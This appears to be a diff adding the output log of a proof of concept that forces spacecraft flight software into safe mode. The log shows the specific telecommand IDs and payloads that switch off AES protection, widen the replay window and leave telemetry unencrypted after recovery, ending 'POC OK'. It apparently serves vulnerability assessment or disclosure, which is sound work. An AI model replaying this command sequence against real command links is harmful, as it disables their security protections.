@@ -1,0 +1,65 @@
+[   0.000] ========================================================================
+[   0.000] V-22 forced safe-mode protection downgrade
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x15 via=usb AES  payload=011005
+[   0.000] <-- TM apid=0x15 clear len=6
+[   0.000] --> TC apid=0x15 via=usb AES  payload=011005
+[   0.001] <-- TM apid=0x15 clear len=6
+[   0.001] --> TC apid=0x0C via=usb AES  payload=-
+[   0.002] <-- TM apid=0x0C AES len=27
+[   0.002] nominal: secure=True arc_window=5
+[   0.002] --> TC apid=0x1D via=radio AES  payload=02
+[   0.002] <-- TM apid=0x1D clear len=4
+[   0.002] --> TC apid=0x0C via=usb clear payload=-
+[   0.002] <-- TM apid=0x0C clear len=27
+[   0.002] --> TC apid=0x15 via=usb clear payload=011005
+[   0.002] <-- TM apid=0x15 clear len=6
+[   0.002] in safe: secure=False arc_window=15 (AES engine OFF, replay window relaxed 5 -> 15)
+[   0.002] --> TC apid=0x1D via=usb clear payload=03
+[   0.002] <-- TM apid=0x1D clear len=4
+[   0.002] <-- TM apid=0x09 clear len=15
+[   0.002] --> advance(121000 ms)
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x0E clear len=30
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x3FF clear len=14
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x0E clear len=30
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x3FF clear len=14
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x0E clear len=30
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x0E clear len=30
+[   0.004] <-- TM apid=0x3FF clear len=14
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x0E clear len=30
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] <-- TM apid=0x08 clear len=20
+[   0.004] <-- TM apid=0x3FF clear len=14
+[   0.004] <-- TM apid=0x01 clear len=8
+[   0.004] <-- TM apid=0x01 clear len=64
+[   0.004] --> TC apid=0x1D via=usb clear payload=03
+[   0.004] <-- TM apid=0x1D clear len=4
+[   0.004] --> TC apid=0x0C via=usb clear payload=-
+[   0.004] <-- TM apid=0x0C clear len=27
+[   0.004] after recovery: NOMINAL again but secure=False -> downgrade OUTLIVES the safe-mode episode
+[   0.004] cost to attacker: 1 TC; benefit: >=120 s relaxed replay window + permanent cleartext telemetry until the operator notices
+[   0.004] ========================================================================
+[   0.004] POC OK
+[   0.004] ========================================================================
